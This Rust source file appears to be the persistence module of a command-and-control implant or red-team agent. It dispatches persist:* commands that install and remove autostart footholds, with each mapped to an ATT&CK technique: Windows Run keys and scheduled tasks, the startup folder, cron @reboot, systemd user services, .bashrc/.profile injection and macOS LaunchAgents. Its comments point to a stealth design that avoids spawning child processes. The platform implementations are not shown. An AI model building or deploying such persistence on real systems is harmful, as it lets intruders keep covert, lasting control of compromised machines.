// src/agent/persistence/mod.rs
//
// Persistence module. First-class persist:* commands backed by native
// implementations — no exec_os wrappers, no Rhai scripts, no child-process
// spawning (exception: crontab on Linux, which has no kernel-direct path
// for non-root users).
//
// ATT&CK coverage:
//   T1547.001  Registry Run Key (Windows — HKCU and HKLM)
//   T1053.005  Scheduled Task (Windows — COM ITaskService, no schtasks.exe)
//   T1547.009  Startup Folder (Windows)
//   T1053.003  Cron (Linux / macOS)
//   T1543.002  Systemd User Service (Linux)
//   T1546.004  Shell Profile Injection (Linux — .bashrc / .profile)
//   T1543.001  LaunchAgent (macOS)

#[cfg(target_os = "windows")]
pub mod windows;

#[cfg(target_os = "linux")]
pub mod linux;

#[cfg(target_os = "macos")]
pub mod macos;

// ── Windows ───────────────────────────────────────────────────────────

/// T1547.001 — HKCU\...\Run (no admin required)
pub fn install_run(name: &str, path: &str) -> Result<String, String> {
    #[cfg(target_os = "windows")]
    return windows::install_run(name, path, false);
    #[cfg(not(target_os = "windows"))]
    { let _ = (name, path); Err("Windows only".into()) }
}

/// T1547.001 — HKLM\...\Run (admin required)
pub fn install_run_hklm(name: &str, path: &str) -> Result<String, String> {
    #[cfg(target_os = "windows")]
    return windows::install_run(name, path, true);
    #[cfg(not(target_os = "windows"))]
    { let _ = (name, path); Err("Windows only".into()) }
}

pub fn remove_run(name: &str) -> Result<String, String> {
    #[cfg(target_os = "windows")]
    return windows::remove_run(name, false);
    #[cfg(not(target_os = "windows"))]
    { let _ = name; Err("Windows only".into()) }
}

pub fn remove_run_hklm(name: &str) -> Result<String, String> {
    #[cfg(target_os = "windows")]
    return windows::remove_run(name, true);
    #[cfg(not(target_os = "windows"))]
    { let _ = name; Err("Windows only".into()) }
}

/// T1053.005 — Scheduled task via COM ITaskService (logon trigger, least privilege)
pub fn install_task(name: &str, path: &str) -> Result<String, String> {
    #[cfg(target_os = "windows")]
    return windows::install_task(name, path);
    #[cfg(not(target_os = "windows"))]
    { let _ = (name, path); Err("Windows only".into()) }
}

pub fn remove_task(name: &str) -> Result<String, String> {
    #[cfg(target_os = "windows")]
    return windows::remove_task(name);
    #[cfg(not(target_os = "windows"))]
    { let _ = name; Err("Windows only".into()) }
}

/// T1547.009 — User startup folder
pub fn install_startup(name: &str, path: &str) -> Result<String, String> {
    #[cfg(target_os = "windows")]
    return windows::install_startup(name, path);
    #[cfg(not(target_os = "windows"))]
    { let _ = (name, path); Err("Windows only".into()) }
}

pub fn remove_startup(name: &str) -> Result<String, String> {
    #[cfg(target_os = "windows")]
    return windows::remove_startup(name);
    #[cfg(not(target_os = "windows"))]
    { let _ = name; Err("Windows only".into()) }
}

// ── Linux ─────────────────────────────────────────────────────────────

/// T1053.003 — @reboot crontab (Linux)
pub fn install_cron_linux(path: &str) -> Result<String, String> {
    #[cfg(target_os = "linux")]
    return linux::install_cron(path);
    #[cfg(not(target_os = "linux"))]
    { let _ = path; Err("Linux only".into()) }
}

pub fn remove_cron_linux(path: &str) -> Result<String, String> {
    #[cfg(target_os = "linux")]
    return linux::remove_cron(path);
    #[cfg(not(target_os = "linux"))]
    { let _ = path; Err("Linux only".into()) }
}

/// T1543.002 — Systemd user service
pub fn install_systemd(name: &str, path: &str) -> Result<String, String> {
    #[cfg(target_os = "linux")]
    return linux::install_systemd(name, path);
    #[cfg(not(target_os = "linux"))]
    { let _ = (name, path); Err("Linux only".into()) }
}

pub fn remove_systemd(name: &str) -> Result<String, String> {
    #[cfg(target_os = "linux")]
    return linux::remove_systemd(name);
    #[cfg(not(target_os = "linux"))]
    { let _ = name; Err("Linux only".into()) }
}

/// T1546.004 — Shell profile injection (~/.bashrc and ~/.profile)
pub fn install_profile(path: &str) -> Result<String, String> {
    #[cfg(target_os = "linux")]
    return linux::install_profile(path);
    #[cfg(not(target_os = "linux"))]
    { let _ = path; Err("Linux only".into()) }
}

pub fn remove_profile(path: &str) -> Result<String, String> {
    #[cfg(target_os = "linux")]
    return linux::remove_profile(path);
    #[cfg(not(target_os = "linux"))]
    { let _ = path; Err("Linux only".into()) }
}

// ── macOS ─────────────────────────────────────────────────────────────

/// T1543.001 — LaunchAgent plist (~user/Library/LaunchAgents)
pub fn install_launchagent(label: &str, path: &str) -> Result<String, String> {
    #[cfg(target_os = "macos")]
    return macos::install_launchagent(label, path);
    #[cfg(not(target_os = "macos"))]
    { let _ = (label, path); Err("macOS only".into()) }
}

pub fn remove_launchagent(label: &str) -> Result<String, String> {
    #[cfg(target_os = "macos")]
    return macos::remove_launchagent(label);
    #[cfg(not(target_os = "macos"))]
    { let _ = label; Err("macOS only".into()) }
}

/// T1053.003 — @reboot crontab (macOS)
pub fn install_cron_macos(path: &str) -> Result<String, String> {
    #[cfg(target_os = "macos")]
    return macos::install_cron(path);
    #[cfg(not(target_os = "macos"))]
    { let _ = path; Err("macOS only".into()) }
}

pub fn remove_cron_macos(path: &str) -> Result<String, String> {
    #[cfg(target_os = "macos")]
    return macos::remove_cron(path);
    #[cfg(not(target_os = "macos"))]
    { let _ = path; Err("macOS only".into()) }
}

// ── Inventory ─────────────────────────────────────────────────────────

/// Return a human-readable inventory of installed persistence mechanisms.
pub fn list() -> String {
    #[cfg(target_os = "windows")]
    return windows::list();
    #[cfg(target_os = "linux")]
    return linux::list();
    #[cfg(target_os = "macos")]
    return macos::list();
    #[cfg(not(any(target_os = "windows", target_os = "linux", target_os = "macos")))]
    "Unsupported platform".to_string()
}
